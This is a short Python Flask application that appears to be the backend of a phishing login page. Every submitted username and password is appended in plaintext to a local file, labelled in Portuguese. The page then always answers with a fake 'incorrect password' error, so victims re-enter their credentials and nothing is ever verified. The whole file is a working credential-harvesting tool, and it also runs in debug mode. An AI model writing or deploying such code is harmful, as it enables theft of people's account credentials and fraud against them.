from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    with open("logins.txt", "a") as f:
        f.write(f"Usuário: {username} | Senha: {password}\n")

    return render_template("login.html", error="Senha incorreta. Tente novamente.")

if __name__ == "__main__":
    app.run(debug=True)
